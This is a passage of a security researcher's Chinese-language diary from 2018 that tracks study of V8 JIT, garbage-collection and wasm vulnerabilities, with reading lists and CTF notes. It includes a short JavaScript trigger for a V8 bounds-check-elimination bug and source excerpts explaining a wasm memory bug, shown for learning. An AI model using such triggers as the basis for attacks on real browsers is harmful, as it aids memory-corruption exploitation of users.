href="https://www.zhihu.com/question/290982869/answer/474629999" target="_blank" rel="noopener">https://www.zhihu.com/question/290982869/answer/474629999</a></li><li>最近在调的那个洞，通过改源码，打印遍历路径，确实看到了一些不一样的东西，差不多分析了0.1吧。。明天继续磕</li><li>v8新出了一个wasm的编译器Liftoff好像，又有新东西可以看了ORZ<br><a href="https://v8project.blogspot.com/2018/08/liftoff.html" target="_blank" rel="noopener">https://v8project.blogspot.com/2018/08/liftoff.html</a></li><li>和学长聊天，原来他刚毕业那会还在keen team实习过，那时候科恩还没并入腾讯。</li></ol><h2 id="2018-8-22-23"><a href="#2018-8-22-23" class="headerlink" title="2018-8-22-23"></a>2018-8-22-23</h2><ol><li>这周末就要跑路了，这个洞还没分析的很好，不过还是学到了不少东西。<br>JIT里面的算法相关的代码看了不少了，还读了paper，找到了一些IR的paper读。<br>trace的log基本能看懂不少了。<br>心态平和了很多，虽然我还是看不懂并且很可能一直看不懂ORZ。</li><li>不过总算写好了第一版报告。</li></ol><h2 id="2018-8-24-25"><a href="#2018-8-24-25" class="headerlink" title="2018-8-24-25"></a>2018-8-24-25</h2><ol><li>我一直不是一个很聪明的人，但是我确实是一个喜欢隔一段时间反思一下自己的人，重新审视了一下从7-8月我所学，其实本来我能做的更好，只是因为自己的懒和菜没有看更多，也该收拾心情往前走了。</li></ol><h2 id="2018-8-26-31"><a href="#2018-8-26-31" class="headerlink" title="2018-8-26-31"></a>2018-8-26-31</h2><ol><li>回了一趟学校，把外出实习申请和体测搞完了，然后sky师傅让我准备一个分享。。ORZ，我咋都不会啊，好方，在线等挺急的。</li><li>收到留用短信，还是蛮开心，加油加油。</li><li>v8 GC相关的东西准备看一下，先罗列一下资源</li></ol><ul><li>Are your v8 garbage collection logs speaking to you?Joyee Cheung -Alibaba Cloud(Alibaba Group)<br><a href="https://www.slideshare.net/NodejsFoundation/are-your-v8-garbage-collection-logs-speaking-to-youjoyee-cheung-alibaba-cloudalibaba-group" target="_blank" rel="noopener">https://www.slideshare.net/NodejsFoundation/are-your-v8-garbage-collection-logs-speaking-to-youjoyee-cheung-alibaba-cloudalibaba-group</a><br><a href="https://www.youtube.com/watch?v=DSBLAG2IvsY" target="_blank" rel="noopener">https://www.youtube.com/watch?v=DSBLAG2IvsY</a></li><li>Jank Busters Part Two: Orinoco<br><a href="https://v8project.blogspot.com/2016/04/jank-busters-part-two-orinoco.html" target="_blank" rel="noopener">https://v8project.blogspot.com/2016/04/jank-busters-part-two-orinoco.html</a></li><li>2016 Beijing node live-Chau Yee Cheung-Are Your V8 GC Logs Speaking to You?<br><a href="https://www.youtube.com/watch?v=ZWtvUxl6Pyo" target="_blank" rel="noopener">https://www.youtube.com/watch?v=ZWtvUxl6Pyo</a></li><li>垃圾回收的算法与实现<br><a href="http://library1.ga/_ads/2CCD392F898D2D1DFAD1271E01CF1CB0" target="_blank" rel="noopener">http://library1.ga/_ads/2CCD392F898D2D1DFAD1271E01CF1CB0</a></li><li>A tour of V8: Garbage Collection<br><a href="http://jayconrod.com/posts/55/a-tour-of-v8-garbage-collection" target="_blank" rel="noopener">http://jayconrod.com/posts/55/a-tour-of-v8-garbage-collection</a></li><li>Memory management in Blink<br><a href="https://chromium.googlesource.com/chromium/src/+/0e94f26e8/third_party/WebKit/Source/wtf/Allocator.md" target="_blank" rel="noopener">https://chromium.googlesource.com/chromium/src/+/0e94f26e8/third_party/WebKit/Source/wtf/Allocator.md</a></li><li>V8 —— 你需要知道的垃圾回收机制<br><a href="https://juejin.im/post/5b398981e51d455e2c33136b" target="_blank" rel="noopener">https://juejin.im/post/5b398981e51d455e2c33136b</a></li><li>解读 V8 GC Log（二）: 堆内外内存的划分与 GC 算法<br><a href="https://yq.aliyun.com/articles/592880?spm=a2c4e.11153959.0.0.abf75fbdaPONjd" target="_blank" rel="noopener">https://yq.aliyun.com/articles/592880?spm=a2c4e.11153959.0.0.abf75fbdaPONjd</a></li></ul><h2 id="2018-9-1-3"><a href="#2018-9-1-3" class="headerlink" title="2018-9-1-3"></a>2018-9-1-3</h2><ol><li>有点无聊，不想写日记了。</li><li>这两天在看其他phase，审相关的一个新洞，一个不错的攻击面，说不定有洞可以挖。</li><li>和我关系不错的一个同事今天离职了，有点小难过。</li><li>这两天在看了一点编译优化的算法。</li><li>想去蹭北大的课旁听，不知道值得不。<br><a href="https://xiongyingfei.github.io/SA/2017/main.htm" target="_blank" rel="noopener">https://xiongyingfei.github.io/SA/2017/main.htm</a></li><li>R大的回答依然很赞。。<br><a href="https://www.zhihu.com/question/28679215/answer/43883727" target="_blank" rel="noopener">https://www.zhihu.com/question/28679215/answer/43883727</a></li></ol><h2 id="2018-9-4-5"><a href="#2018-9-4-5" class="headerlink" title="2018-9-4-5"></a>2018-9-4-5</h2><ol><li>整理了一下v8的pipeline，重新调试分析了从bytecode-&gt;graph这么一个过程，然后把一个类型混淆导致的OOB写了一下分析。</li><li>看chakra的笔记，明月师傅太棒了。ORZ</li></ol><h2 id="2018-9-6-14"><a href="#2018-9-6-14" class="headerlink" title="2018-9-6-14"></a>2018-9-6-14</h2><ol><li>日记写的越来越少了，感觉慢慢习惯社畜生活√</li><li>做分享用的PPT，把v8 IR/GC等等写了一下，说来今天是v8 10周年来着……</li><li>收到录用电话，以后就是xlabのsakura。</li><li>写了两篇分析给导师，天天审代码ORZ。</li><li>对，我现在就是饿了在等夜宵（6:15)</li><li>这周真是摸鱼……不行不行……要振作！</li><li>以后要习惯早睡了，半夜突然心跳过速，4点多……去医院待到六点多降下来了，还好医生说除了心率快，其他的波形都正常……就是熬夜+焦虑吧。。<br>马上买了个小米手环……强制自己12点睡着，命重要命重要ORZ</li><li>录用函发下来了，等十月中旬谈薪资待遇，乖巧.jpg</li></ol><h2 id="2018-9-15-16"><a href="#2018-9-15-16" class="headerlink" title="2018-9-15-16"></a>2018-9-15-16</h2><ol start="2"><li>上周怠惰了一周，下周准备开始从能利用的漏洞开始看了，JIT算法什么的先放一边，然后给自己点高效的正反馈。</li></ol><h2 id="2018-9-17-21"><a href="#2018-9-17-21" class="headerlink" title="2018-9-17-21"></a>2018-9-17-21</h2><ol><li>这周看了几个能利用的漏洞，整理了一下exp写法，龚广那个oob read-&gt;任意地址读写的写法真的好6……，主要在对外发exp的就那么几个人，lokihardt，大宝，龚广，KK。</li><li>今天lw师傅分享了v8 UAF，绝赞，加上v8的wasm整理一下下一阶段的工作，继续学习。</li></ol><h2 id="2018-9-22"><a href="#2018-9-22" class="headerlink" title="2018-9-22"></a>2018-9-22</h2><ol><li>今天整理了一下接下来看什么，先把v8 oob和type confused的几种利用方法和primitive写了一下，ArrayBuffer的backing store这块涉及PartitionAlloc就不是很懂，学习看看。</li></ol><h2 id="2018-9-23-28"><a href="#2018-9-23-28" class="headerlink" title="2018-9-23-28"></a>2018-9-23-28</h2><ol start="2"><li>这周主要还是顺着JIT的洞看了一下，主要就是loki交的几个洞。<br>762874是lastIndexOf中Range Analysis出错，本来范围应该是(-1,maxlength)，但是它代码是写的是(-1,maxlength-1)，然后范围分析错了之后，通过简单构造，可以在优化的时候觉得索引始终在数组边界内，于是就在simplifed lowering里reduce掉了checkbounds。<br>但是在新版本v8里，它不会对checkbounds进行消除，加了一个flag，只能在终端启动的时候选择禁用，无法绕过。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">  var i &#x3D; &#39;A&#39;.repeat(2**28 - 16).indexOf(&quot;&quot;, 2**28);</span><br><span class="line">  i +&#x3D; 16; &#x2F;&#x2F; real value: i &#x3D; 2**28, optimizer: i &#x3D; 2**28-1</span><br><span class="line">  i &gt;&gt;&#x3D; 28; &#x2F;&#x2F; real value i &#x3D; 1, optimizer: i &#x3D; 0</span><br><span class="line">  i *&#x3D; 100000; &#x2F;&#x2F; real value i &#x3D; 100000, optimizer: i &#x3D; 0</span><br><span class="line">  if (i &gt; 3) &#123;</span><br><span class="line">    return 0;</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    var arr &#x3D; [0.1, 0.2, 0.3, 0.4];</span><br><span class="line">    return arr[i];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>然后就把typer这块代码顺着大致看了看。</li></ol><p>还调了一个之前异常里触发的callback，bugs:798644<br>然后在for-loop里改掉了array的类型，从DICTIONARY_ELEMENTS-&gt;HOLEY_ELEMENTS。<br>loki用了一个unshift来把dictionary重新compact，patch里是在for-loop里加了一个类型检查，然后在新版v8里unshift不再能重新compact了，这个特性也没了。<br>本质上其实还是一个prerequisite不满足引起的fastpath bug，但是loki能想到这么触发真的很厉害。</p><p>还有一个在InferReceiverMaps因为new.target被直接当成JSFunction处理，但是其实这里可以接收任何带有constructor的JSReceiver，于是就类型混淆了，之前看过，但是没写笔记，也没好好看这个洞能不能利用，就翻出来想调一下重新看一下。</p><p>最后是之前v8 6.9提到的dataview的新特性</p><p>Dataview在6.9版本做了比较大的更新</p><ul><li>runtime从c++迁移到CSA,用torque(一种用于生成CSA的DSL)重写</li><li>JSCall中进行builtin inline</li></ul><p>然后我主要是在审JSCall里对DataView的runtime inline的地方，刚开始看。<br>其他的就想了一些调试看代码的方法，后面我会总结一下写个文档。</p><h2 id="2018-9-29-10-8"><a href="#2018-9-29-10-8" class="headerlink" title="2018-9-29-10-8"></a>2018-9-29-10-8</h2><ol><li>最近主要就是在学漏洞利用，感觉不错，你看，整天搞分析的时候觉得想写利用，现在天天写利用又觉得还是想再做点分析，矛盾++</li><li>博客好久没更新了，文章全都更新在本地了。。不过有v8的问题欢迎一起讨论学习啦（给大佬递茶）。。QQ/Wechat在关于页面有……</li><li>慢慢习惯了现在的工作呢，每天想做就有一堆事情可以做，不想做可以什么都不做……</li></ol><h2 id="2018-10-9-10-27"><a href="#2018-10-9-10-27" class="headerlink" title="2018-10-9-10-27"></a>2018-10-9-10-27</h2><ol><li>整理一下最近学了什么，分析清楚了几个v8的JIT漏洞，暂时把v8的exp学习告一段落了，剩下的都不好写。</li><li>搞了一个无脑杂交的js fuzz，效果还行，出乎我的意料</li><li>漏洞会挖到的。</li></ol><h2 id="2018-10-28-10-29"><a href="#2018-10-28-10-29" class="headerlink" title="2018-10-28-10-29"></a>2018-10-28-10-29</h2><ol><li>整理了一下朋友给我的win kernel exploit资料，准备后面学习一下。<br>win kernel环境搭建<br><a href="https://bbs.pediy.com/thread-247019.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-247019.htm</a><br>基础知识<br><a href="https://rootkits.xyz/blog/" target="_blank" rel="noopener">https://rootkits.xyz/blog/</a><br><a href="https://xiaodaozhi.com/" target="_blank" rel="noopener">https://xiaodaozhi.com/</a><br>顺便推一下他的博客。<br><a href="https://www.redog.me/" target="_blank" rel="noopener">https://www.redog.me/</a><br><a href="https://github.com/redogwu/windows_kernel_exploit" target="_blank" rel="noopener">https://github.com/redogwu/windows_kernel_exploit</a></li><li>顺便归档一下其他的资料<br>vm escape资料<br><a href="https://dangokyo.me/2018/03/02/go-for-vm-escape/" target="_blank" rel="noopener">https://dangokyo.me/2018/03/02/go-for-vm-escape/</a><br>IE漏洞资料<br><a href="https://github.com/wnagzihxa1n/BrowserSecurity/blob/master/%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99.md" target="_blank" rel="noopener">https://github.com/wnagzihxa1n/BrowserSecurity/blob/master/%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99.md</a></li><li>看了一下seccon2018的wp，艺术字那个题没找到wp，但是trick很多做不来，看了一道入门rop和kidvm；看了一下google ctf2018 Final，两道chrome的题目都不太会做，卒。</li><li>今天上午开了实验室大会，很有意思。</li><li>需要看一下wasm的东西了，blink to do，又是坑<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=826434" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=826434</a><br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=836141" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=836141</a><br><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1642" target="_blank" rel="noopener">https://bugs.chromium.org/p/project-zero/issues/detail?id=1642</a></li><li>需要记录一下google ctf2018的一个有趣的challenge。<br>这个赛题应该是涉及两个知识点，一个是v8的range analysis和remove checkBounds<br>一个是浏览器里的浮点数是有精度极限的，合理构造能得到有趣的东西。<br><a href="https://gctf-2018.appspot.com/#challenges/pwn-just-in-time" target="_blank" rel="noopener">https://gctf-2018.appspot.com/#challenges/pwn-just-in-time</a><br><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Number/MAX_SAFE_INTEGER" target="_blank" rel="noopener">https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Number/MAX_SAFE_INTEGER</a><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">opt</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  x = <span class="number">0.1</span>;</span><br><span class="line">  x = x + <span class="number">2</span> + <span class="built_in">Number</span>.MAX_SAFE_INTEGER ;</span><br><span class="line">  <span class="keyword">return</span> x</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">opt();</span><br><span class="line">b=opt();</span><br><span class="line">%OptimizeFunctionOnNextCall(opt);</span><br><span class="line">a = opt();</span><br><span class="line">print(b);</span><br><span class="line">print(a);</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"><span class="number">9007199254740994</span></span><br><span class="line"><span class="number">9007199254740992</span></span><br></pre></td></tr></table></figure><h2 id="2018-10-30-11-8"><a href="#2018-10-30-11-8" class="headerlink" title="2018-10-30-11-8"></a>2018-10-30-11-8</h2></li><li>最近还是在主要花时间写利用和分析JIT上，理解checkbounds remove和checkmaps remove对我帮助很大。似乎能够建立起一套新的利用方式。</li><li>用gdb直接调试手机chrome真的是个大坑。</li></ol><h2 id="2018-11-9-11-10"><a href="#2018-11-9-11-10" class="headerlink" title="2018-11-9-11-10"></a>2018-11-9-11-10</h2><ol><li>看google ctf2018那道题，想完整的调一下chrome上的rce，小书包掏出IDA，现在的最大的问题是我需要逆向出math.cos这样的数学函数来帮我下断点，不然我写不了利用。<br>这可太难了。有没有大佬教教我~</li><li>（11-17日补充）：搞出来了，也没有很难，摊手。</li></ol><h2 id="2018-11-17"><a href="#2018-11-17" class="headerlink" title="2018-11-17"></a>2018-11-17</h2><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-17-114730.jpg" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-17-115025.jpg" alt=""><br>今天是想说一下天府杯啦，xuanwu lab第二，lw师傅打了三个手机浏览器项目，很厉害，明年我也要打。<br>其实打手机浏览器我已经准备了很多了，很多chrome v8能利用的漏洞，我都在linux上写了exp，剩下的事情并不复杂了，只要能调试和简单的逆向，然后适配手机就OK了。<br>所以其实呢平时多积累1day的exploit是很有意义的一件事情，到用到的时候就简单适配就好了。<br>让我感慨比较多的还是大宝，大宝太强了，他一个人可以搞定所有的浏览器，而且花了并不长的时间学习和搞定了ios的越狱。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-17-120007.png" alt=""><br><a href="https://www.anquanke.com/post/id/149939" target="_blank" rel="noopener">https://www.anquanke.com/post/id/149939</a><br>顺手mark一下他当时的议题，虽然找不到PPT，mosec就是这点不好，完全不公开，只能找到这点资料了。</p><p>我现在在xuanwu lab做的并不是很好，挖v8的洞也挖不到，写利用也用不到我，感觉自己的工作就是完全在自学，比较边缘化，但是大家都是这么过来的，总有需要我忙起来的时候，在那之前我只需要不断的积累积累和积累。</p><p>其实在这里我想提一件好玩的事情，那就是，<strong>如果你不尝试，你永远不知道自己能做到哪一步。</strong><br>看过我日记的话应该知道，我其实只是从今年二三月份才开始调试CVE的，而且是先搞的内核的漏洞，而浏览器漏洞可能在面试之前只搞过两个周多些（可能更短，然后在实习之前又有很多其他杂七杂八的事情干扰了我，比如期末考试），在实习之前才花了些时间补充了一些基础知识，但我知道远远不够。<br>然后我面过了xuanwu lab的浏览器组，似乎也拿到了其他的offer（似乎）<br>在实习的大概四个月里，我学会了如何去审计和分析，积累浏览器特性；<br>学习了如何写一个能跑起来的js fuzz；<br>学会了如何调试chrome，在PC上写一个完整的chrome exploit；<br>一些推特上的大佬给了我不少帮助，感觉大佬们真的是很平易近人了，还有其他朋友和我一起研究了不少东西，我觉得很开心。</p><p>我们这个行业发展是很快的，要跟上前面的人的进度，就必须跑起来，飞快的跑起来。</p><p>后面的打算是，和大宝说的差不多，一是仔细审计和分析学习历史漏洞，找找how to bypass patch的点，二是好好学习一下其他浏览器上的JIT，比如edge比如jsc，重点学习大宝和loki的洞，寻找更多的启发性的点。<br>积累下去，我会变得更好的，我确定。</p><h2 id="2018-11-19"><a href="#2018-11-19" class="headerlink" title="2018-11-19"></a>2018-11-19</h2><ol><li>今天在翻jsc的漏洞exploit，认识了一个越狱大佬，和大佬交流了一下，然后学会了怎么单独编译jsc和怎么找patch。<br>后面预备写一个jsc漏洞利用系列，todo it。</li><li><a href="https://www.w3.org/TR/wasm-js-api-1/" target="_blank" rel="noopener">https://www.w3.org/TR/wasm-js-api-1/</a><br>今天在翻wasm的文档，调试分析<a href="https://bugs.chromium.org/p/chromium/issues/detail?id=766253，看partitionAllocation的头秃，d8还调不了，配了一下windbg的调试环境，搞了一下符号和断点。" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=766253，看partitionAllocation的头秃，d8还调不了，配了一下windbg的调试环境，搞了一下符号和断点。</a></li><li>感觉有锅（项目），但是估计不是我背锅，继续干活。。困死我了。</li><li>终于找到了，可以写exp了。</li></ol><h2 id="2018-11-22"><a href="#2018-11-22" class="headerlink" title="2018-11-22"></a>2018-11-22</h2><ol><li>这周前两天配调试环境+去医院。</li><li>后两天分析root cause+去医院，倒是找到了root cause和它可能产生的影响，但是到了在partitionAlloc堆上调试exp，又懵了……<br>感觉在做一道非常难的pwn题。。</li></ol><h2 id="2018-11-23"><a href="#2018-11-23" class="headerlink" title="2018-11-23"></a>2018-11-23</h2><ol><li><p>先说结论<a href="https://cs.chromium.org/chromium/src/base/allocator/partition_allocator/partition_freelist_entry.h?g=0&amp;l=23" target="_blank" rel="noopener">https://cs.chromium.org/chromium/src/base/allocator/partition_allocator/partition_freelist_entry.h?g=0&amp;l=23</a><br>猜我已经全猜出来了，后面整理文档。漏洞很有意思。</p></li><li><p>这个漏洞的root cause就是在一个wasm实例化<code>InstanceBuilder::InstanceBuilder</code>的时候<br>因为触发了一次回调。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">int InstanceBuilder::ProcessImports(Handle&lt;FixedArray&gt; code_table,</span><br><span class="line">  ...</span><br><span class="line">  ...</span><br><span class="line">      MaybeHandle&lt;Object&gt; result &#x3D;</span><br><span class="line">        module_-&gt;is_asm_js() ? LookupImportAsm(index, import_name)</span><br><span class="line">                             : LookupImport(index, module_name, import_name);</span><br></pre></td></tr></table></figure><p>于是又进行了一次wasm2的实例化，因为wasm的实例化里有这么一个判断。<br>它会先把已有的compiled_module对象拿来用，首先检查它有没有owner，如果有了就克隆一份。<br>因为我们是在还没有设置owner之前就触发了回调再次实例化，于是两个wasm对象的compiled_module是一样的。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Handle&lt;WasmCompiledModule&gt; original;</span><br><span class="line">    &#123;</span><br><span class="line">      DisallowHeapAllocation no_gc;</span><br><span class="line">      original = handle(module_object_-&gt;compiled_module());</span><br><span class="line">      <span class="keyword">if</span> (original-&gt;has_weak_owning_instance()) &#123;</span><br><span class="line">        owner = handle(WasmInstanceObject::cast(</span><br><span class="line">            original-&gt;weak_owning_instance()-&gt;value()));</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (original-&gt;has_weak_owning_instance()) &#123;</span><br><span class="line">      <span class="comment">// Clone, but don't insert yet the clone in the instances chain.</span></span><br><span class="line">      <span class="comment">// We do that last. Since we are holding on to the owner instance,</span></span><br><span class="line">      <span class="comment">// the owner + original state used for cloning and patching</span></span><br><span class="line">      <span class="comment">// won't be mutated by possible finalizer runs.</span></span><br><span class="line">      DCHECK(!owner.is_null());</span><br><span class="line">      ...</span><br><span class="line">      TRACE(<span class="string">"Cloning from %d\n"</span>, original-&gt;instance_id());</span><br></pre></td></tr></table></figure><p>在后面grow掉wasm2的buffer的时候，会将两个instance的wasm_memory_reference都改掉。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RelocInfo::update_wasm_memory_reference</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    Isolate* isolate, Address old_base, Address new_base,</span></span></span><br><span class="line"><span class="function"><span class="params">    ICacheFlushMode icache_flush_mode)</span> </span>&#123;</span><br><span class="line"><span class="comment">//  DCHECK(IsWasmMemoryReference(rmode_));</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"new_base is :%p\n"</span>,new_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"old_base is :%p\n"</span>,old_base);</span><br><span class="line">  Address updated_reference = new_base + (wasm_memory_reference() - old_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"updated_reference is:%p\n"</span>,updated_reference);</span><br><span class="line">  <span class="comment">// The reference is not checked here but at runtime. Validity of references</span></span><br><span class="line">  <span class="comment">// may change over time.</span></span><br><span class="line">  set_embedded_address(isolate, updated_reference, icache_flush_mode);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>具体的还要再看看，剩下主要还是在看partitionAlloc，<br>利用基本上是搞明白了，一些细节的东西还是要整理一下。</p></li><li><p>组会被问chrome sandbox escape，啥都不会的我。。太菜了ORZ</p></li><li><p>这周基本上就是在调试wasm的漏洞，和实现一个arraybuffer oob r/w的exp吧，后者geohot在2014年就搞过了23333.</p></li></ol><h2 id="2018-11-27"><a href="#2018-11-27" class="headerlink" title="2018-11-27"></a>2018-11-27</h2><ol><li>这一周基本上都在医院辗转度过……考虑是植物神经紊乱吧。<br>摸鱼休息，调整饮食和作息，锻炼身体，不知不觉已经老了ORZ。<br>说到底。。经常凌晨三四点睡觉还不吃早饭。。能苟活到现在我也太幸运了。。</li><li>可惜了realworld ctf，估计是不能去了，这段时间还是养病重要。。要吃清淡了。。趴桌</li><li>把partitionAlloc大概看了看，基本没问题了，利用也基本写完了，不过在任意地址读写的原语之后，如何得到一个完整的exp，还要商榷一下，windbg很厉害。。’dx -r1 isolate’<br>cheat engine也很厉害……<br>不过说来调的时候发现了很多有意思的东西，可以顺手再逆一下chrome了。<br>另外在看之前的东西的时候，发现typedArray的elements里原来就有存arraybuffer的backingstore，越界直接写这里就行了。。</li><li>准备看下天府杯的那个洞了，基本上定位到了patch，这两天调一下看看。</li><li>试图编译chrome apk，然后用来恢复符号，看看能不能在国产手机浏览器上找到点有用的调试符号。这个真的是很头疼呀，也不太好意思问同事，趴桌。</li></ol><h2 id="2018-11-30"><a href="#2018-11-30" class="headerlink" title="2018-11-30"></a>2018-11-30</h2><ol><li>一周结束了，整理一下这周，最近十点睡八点起，过得很有规律，也挺好的，身体也在康复中，很遗憾realworld ctf不能去了，多休息吧。</li><li>在最新版chrome上面写了exp，简单的栈劫持+mprotect弹计算器，挺开心的。</li><li>说来大概从开始写利用也搞了两个月了，稍微有点进度感人，但是总算还是搞的差不多了，对GC管理还要再熟悉，不过很开心了。</li><li>接下来主要看看chrome sandbox escape fuzz，然后loki最近在挖jsc的漏洞，这个也值得好好学习一下。</li><li>最近似乎经常有人问我二进制怎么入门……之前看过一个杨博士以前说的，手写一个cpu，手写一个内核，手写一个编译器，然后我觉得最好再手写一个STL库。然后就入门了（逃</li></ol><h2 id="2018-12-3"><a href="#2018-12-3" class="headerlink" title="2018-12-3"></a>2018-12-3</h2><ol><li>扁桃体发炎的我完美错过realworld ctf，熬夜熬的ORZ<br>看了看rw的赛题，safari jsc那道题基本上就是抄的saelo p2o2018的漏洞造的洞，clobeerWorld代表删除之前做出的任何关于类型信息的假设,然后长亭造的这个洞把它删掉了，即假定在for-in循环中检索对象的property是没有副作用的，感觉比v8里好懂多了…<br>exp如果不是因为最近的那个缓解机制的话，应该复制粘贴就能写了。。23333</li><li>病了两周的我今天在补笔记，很多细节忘干净了。ORZ</li></ol><h2 id="2018-12-4"><a href="#2018-12-4" class="headerlink" title="2018-12-4"></a>2018-12-4</h2><ol><li>今天因为学校要交材料回去补第七学期外出实习的证明，置换学分。所以感慨一下，自己的人生好像在走钢丝，一不小心就GG了<br>熟悉我的人可能知道，我学校很一般23333<br>我的小伙伴也觉得：没有强大的背景和资源倒不一定意味着没有前途，只是容错率低得多罢了，在别人探索人生享受诗和远方的时候就不得不找准一条路走到黑，一个环节出了问题，就GG了<br>为什么同样是这个行业，有的人就不会焦虑，因为差距呀。</li><li>然后一件开心的事情是，我导师今天终于和我聊了一下，我还以为我被忘了23333，继续努力就是了。<br>没什么可以选择的，就算掉下去了，我能做的，也只有让自己不要摔的太惨而已。</li><li>补了cve-2017-15401的笔记，完全是windbg和cheatengine写出来的exp可还行（滑稽</li></ol><h2 id="2018-12-5"><a href="#2018-12-5" class="headerlink" title="2018-12-5"></a>2018-12-5</h2><ol><li>龚神的洞看不懂。</li><li>最近在一种思路出了好几个洞，也是厉害，在我觉得没东西看的时候，突然爆炸。。</li></ol><h2 id="2018-12-9"><a href="#2018-12-9" class="headerlink" title="2018-12-9"></a>2018-12-9</h2><ol><li>最近仔细看了看，龚神的洞是worker的序列化和反序列化的问题，这个点从来也没去看过，感觉大家估计也不懂这个东西该怎么用，还是很神奇的一件事情。</li><li>最近对逻辑漏洞十分感兴趣，得益于同事花了两天挖到了一个windows的提权0day</li><li>sqlite的漏洞，可以拿来打Chrome，之前看过一点相关的东西<br><a href="https://worthdoingbadly.com/sqlitebug/" target="_blank" rel="noopener">https://worthdoingbadly.com/sqlitebug/</a></li></ol><h2 id="2018-12-10-17"><a href="#2018-12-10-17" class="headerlink" title="2018-12-10-17"></a>2018-12-10-17</h2><ol><li>最近就一直在解决1710的exp的问题，解决不了，陷入自闭。。<br><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1710" target="_blank" rel="noopener">https://bugs.chromium.org/p/project-zero/issues/detail?id=1710</a></li><li>今天休息一下看看safari 0.5day。<br><a href="http://phrack.org/papers/attacking_javascript_engines.html" target="_blank" rel="noopener">http://phrack.org/papers/attacking_javascript_engines.html</a><br><a href="https://github.com/niklasb/sploits/blob/master/safari/regexp-uxss.html" target="_blank" rel="noopener">https://github.com/niklasb/sploits/blob/master/safari/regexp-uxss.html</a></li></ol><h2 id="2018-12-17-26"><a href="#2018-12-17-26" class="headerlink" title="2018-12-17-26"></a>2018-12-17-26</h2><ol><li>最近一直在摸鱼，群星真好玩.jpg，然后在找方向，一直以来靠分析漏洞和写利用来续了一波命，但是还是没搞懂该怎么挖洞，也没人能告诉我chrome v8的洞怎么挖，论编程的能力，这两年在学校靠自己真的没锻炼出啥来，突然开始意识到自己基础薄弱什么都不会了。<br>别人在学校的时候，就通过上课+实验的方式打了很好的基础，而我……感觉一路走来都是自己一个人xjb搞，偶尔和师傅们交流一下，方向上感觉没什么大的问题，就是真的，嗯，我太弱了。希望大家不要犯这种错误了，但是要是再来一次的话，我还是会选择先进实验室再说。</li><li>操作系统基础学习资料，顺便安利CSAPP<br><a href="https://nju-ics.gitbooks.io/ics2016-programming-assignment/content/" target="_blank" rel="noopener">https://nju-ics.gitbooks.io/ics2016-programming-assignment/content/</a><br><a href="https://github.com/Changochen/nju-pa" target="_blank" rel="noopener">https://github.com/Changochen/nju-pa</a></li><li>逻辑漏洞学习，顺便安利James Forshaw，一直想学也一直没学，就先todo list了<br><a href="https://conference.hitb.org/hitbsecconf2017ams/materials/D2T3%20-%20James%20Forshaw%20-%20Introduction%20to%20Logical%20Privilege%20Escalation%20on%20Windows.pdf" target="_blank" 